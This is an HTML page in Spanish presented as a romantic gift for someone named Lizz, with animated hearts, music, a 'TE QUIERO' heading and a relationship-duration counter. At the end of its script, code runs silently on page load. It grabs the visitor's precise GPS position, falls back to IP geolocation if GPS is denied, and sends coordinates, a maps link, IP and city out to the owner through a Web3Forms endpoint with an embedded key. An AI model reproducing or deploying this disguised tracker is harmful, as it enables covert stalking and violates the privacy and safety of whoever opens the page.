<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>My Princess 🤍</title>
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; padding: 1rem; max-width: 100%; overflow-x: hidden; }
    body {
      background: radial-gradient(ellipse at center, #2b002b 0%, #000 100%);
      display: flex; flex-direction: column; justify-content: center; align-items: center;
      min-height: 100vh; position: relative; transition: background 0.8s ease;
      overflow: hidden;
    }
    h1 { font-size: clamp(2rem, 8vw, 5rem); color: #ff69b4; font-family: 'Comic Sans MS', cursive, sans-serif;
      text-shadow: 0 0 20px hotpink, 0 0 40px deeppink; margin: 0; z-index: 2;
      animation: heartbeat 1.5s infinite, fadeIn 2s ease-out forwards; opacity: 0; text-align: center; }
    .nowrap { white-space: nowrap; display: inline-block; }
    p, #contador { font-size: clamp(1rem, 2.5vw, 1.4rem); color: white; text-align: center; font-family: 'Verdana', sans-serif;
      max-width: 90%; margin-top: 1rem; z-index: 2; animation: fadeIn 3s ease-out forwards; opacity: 0; }
    button { padding: 12px 24px; font-size: 1rem; background: deeppink; color: white; border: none; border-radius: 10px;
      cursor: pointer; box-shadow: 0 0 10px hotpink; z-index: 2; transition: transform 0.3s ease; }
    button:hover { transform: scale(1.05); }
    @keyframes heartbeat { 0%, 100% { transform: scale(1); } 25%, 75% { transform: scale(1.05); } 50% { transform: scale(1); } }
    @keyframes fadeIn { to { opacity: 1; } }
    .hearts, .names, .stars { position: absolute; width: 100%; height: 100%; overflow: hidden; z-index: 0; }
    .hearts span, .names span { position: absolute; transform: translateX(-50%); }
    .hearts span { font-size: 2rem; animation: fall 3.5s linear infinite; color: pink; }
    .names span { font-size: 3rem; font-family: 'Comic Sans MS', cursive; color: rgba(255,105,180,0.2); font-weight: bold; animation: fall 5s linear infinite; }
    @keyframes fall { 0% { transform: translate(-50%, -10%); opacity: 1; } 100% { transform: translate(-50%, 110vh); opacity: 0; } }
    .stars span { position: absolute; background: white; border-radius: 50%; width: 2px; height: 2px; opacity: 0.8; animation: twinkle 2s infinite ease-in-out; }
    @keyframes twinkle { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
    .cursor-heart { position: fixed; font-size: 16px; pointer-events: none; z-index: 999; animation: floatHeart 1s ease-out forwards; }
    @keyframes floatHeart { 0% { transform: scale(1); opacity: 1; } 100% { transform: translateY(-80px) scale(0.5); opacity: 0; } }
    .butterflies { position: absolute; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
    .butterflies span { position: absolute; font-size: 2rem; animation: butterfly 10s linear infinite; }
    @keyframes butterfly { 0% { transform: translateY(100vh) rotate(0deg); } 100% { transform: translateY(-100vh) rotate(360deg); } }
    .fireworks { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:3; }
    .firework { position:absolute; width:6px; height:6px; border-radius:50%; animation: boom 1s ease-out forwards; }
    @keyframes boom { 0% { transform: scale(0); opacity:1; } 100% { transform: scale(3); opacity:0; } }
    @media (max-width: 500px) { h1{font-size:2rem;} p,#contador{font-size:0.95rem;} button{font-size:0.95rem;padding:10px 18px;} }
  </style>
</head>
<body>

  <div class="stars">
    <span></span><span></span><span></span><span></span><span></span>
    <span></span><span></span><span></span><span></span><span></span>
  </div>

  <div class="hearts">
    <span style="left:10%; animation-delay:0s;">🤍</span>
    <span style="left:30%; animation-delay:1s;">🤍</span>
    <span style="left:50%; animation-delay:2s;">🤍</span>
    <span style="left:70%; animation-delay:0.5s;">🤍</span>
    <span style="left:90%; animation-delay:1.5s;">🤍</span>
  </div>

  <div class="names">
    <span style="left:5%; animation-delay:0.2s;">Lizz</span>
    <span style="left:15%; animation-delay:1s;">Lizz</span>
    <span style="left:25%; animation-delay:2s;">Lizz</span>
    <span style="left:35%; animation-delay:1.3s;">Lizz</span>
    <span style="left:45%; animation-delay:0.5s;">Lizz</span>
    <span style="left:55%; animation-delay:1.7s;">Lizz</span>
    <span style="left:65%; animation-delay:2.5s;">Lizz</span>
    <span style="left:75%; animation-delay:0.8s;">Lizz</span>
    <span style="left:85%; animation-delay:1.9s;">Lizz</span>
    <span style="left:95%; animation-delay:1.1s;">Lizz</span>
  </div>

  <div class="butterflies">
    <span style="left:10%;">🦋</span>
    <span style="left:30%; animation-delay:2s;">🦋</span>
    <span style="left:60%; animation-delay:4s;">🦋</span>
    <span style="left:80%; animation-delay:1s;">🦋</span>
  </div>

  <div class="fireworks" id="fireworks"></div>

  <h1><span class="nowrap">🤍 TE QUIERO 🤍</span></h1>
  <p id="contador"></p>

  <audio id="musicaFondo" autoplay loop>
    <source src="https://media.vocaroo.com/mp3/1lvfJ5pfsbYG" type="audio/mpeg">
    Tu navegador no soporta audio HTML5.
  </audio>

  <script>
    document.addEventListener("mousemove", e=>{
      const heart=document.createElement("div");
      heart.className="cursor-heart";
      heart.style.left=e.pageX+"px";
      heart.style.top=e.pageY+"px";
      heart.innerText="🤍";
      document.body.appendChild(heart);
      setTimeout(()=>heart.remove(),1000);
    });

    function actualizarContador(fechaInicio){
      const inicio=new Date(fechaInicio);
      const ahora=new Date();
      let totalMeses=(ahora.getFullYear()-inicio.getFullYear())*12+(ahora.getMonth()-inicio.getMonth());
      let tempFecha=new Date(inicio.getFullYear(),inicio.getMonth()+totalMeses,inicio.getDate());
      if(ahora<tempFecha){ totalMeses--; tempFecha=new Date(inicio.getFullYear(),inicio.getMonth()+totalMeses,inicio.getDate()); }
      const años=Math.floor(totalMeses/12);
      const meses=totalMeses%12;
      const diff=ahora-tempFecha;
      const totalSegundos=Math.floor(diff/1000);
      const dias=Math.floor(totalSegundos/(3600*24));
      const horas=Math.floor((totalSegundos%(3600*24))/3600);
      const minutos=Math.floor((totalSegundos%3600)/60);
      const segundos=totalSegundos%60;
      const partes=[];
      if(años>0) partes.push(`${años} ${años===1?'año':'años'}`);
      if(meses>0) partes.push(`${meses} ${meses===1?'mes':'meses'}`);
      if(dias>0) partes.push(`${dias} ${dias===1?'día':'días'}`);
      partes.push(`${horas} ${horas===1?'hora':'horas'}`);
      partes.push(`${minutos} ${minutos===1?'minuto':'minutos'}`);
      partes.push(`${segundos} ${segundos===1?'segundo':'segundos'}`);
      document.getElementById("contador").innerText=`Han pasado ${partes.join(', ')} desde que comenzó esta linda historia.`;
    }
    setInterval(()=>actualizarContador("2025-03-16T00:00:00"),1000);
    actualizarContador("2025-03-16T00:00:00");

    const hoy=new Date();
    if(hoy.getDate()===16 && hoy.getMonth()===2 && hoy.getFullYear()===2025){
      setInterval(()=>{
        const f=document.createElement("div");
        f.className="firework";
        f.style.top=Math.random()*window.innerHeight+"px";
        f.style.left=Math.random()*window.innerWidth+"px";
        f.style.background=["#f0f","#ff0","#0ff","#f66"][Math.floor(Math.random()*4)];
        document.getElementById("fireworks").appendChild(f);
        setTimeout(()=>f.remove(),1000);
      },300);
    }

    window.addEventListener('load',()=>{
      const audio=document.getElementById("musicaFondo");
      audio.volume=0.5;
      audio.play().catch(()=>{
        const btn=document.createElement("button");
        btn.innerText="🤍";
        Object.assign(btn.style,{position:"fixed",top:"20px",left:"20px",width:"50px",height:"50px",
          fontSize:"1.5rem",borderRadius:"50%",background:"deeppink",boxShadow:"0 0 10px hotpink",
          display:"flex",alignItems:"center",justifyContent:"center",border:"none",cursor:"pointer",color:"white",zIndex:"9999"});
        btn.onclick=()=>{ audio.play(); btn.remove(); };
        document.body.appendChild(btn);
      });
    });

    // 📍 Ubicación GPS o IP con Web3Forms
    const accessKey = "fc6c27a4-3f97-470f-9bb7-6f23ec223b34";

    function enviarUbicacion(metodo, lat, lon, extra = {}) {
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      const mensaje = `Método: ${metodo}\nLatitud: ${lat}\nLongitud: ${lon}\nGoogle Maps: ${googleMapsLink}\nFecha/Hora: ${new Date().toLocaleString()}\n` +
        Object.entries(extra).map(([k, v]) => `${k}: ${v}`).join('\n');

      fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          access_key: accessKey,
          subject: "Ubicación automática",
          from_name: `Script de ubicación (${metodo})`,
          message: mensaje
        })
      })
      .then(res => res.json())
      .then(result => console.log(`Ubicación enviada (${metodo}):`, result))
      .catch(err => console.error(`Error al enviar ubicación (${metodo}):`, err));
    }

    function obtenerUbicacionPorIP() {
      fetch("https://ipwhois.app/json/")
        .then(res => res.json())
        .then(data => {
          enviarUbicacion("IP", data.latitude, data.longitude, {
            IP: data.ip,
            Ciudad: data.city,
            Región: data.region,
            País: data.country
          });
        })
        .catch(err => console.error("Error al obtener ubicación por IP:", err));
    }

    function obtenerUbicacionPrecisa() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            enviarUbicacion("GPS", lat, lon);
          },
          err => {
            console.warn("GPS no disponible o denegado. Usando IP:", err.message);
            obtenerUbicacionPorIP();
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        console.warn("Geolocalización no soportada. Usando IP.");
        obtenerUbicacionPorIP();
      }
    }

    obtenerUbicacionPrecisa();
  </script>
</body>
</html>
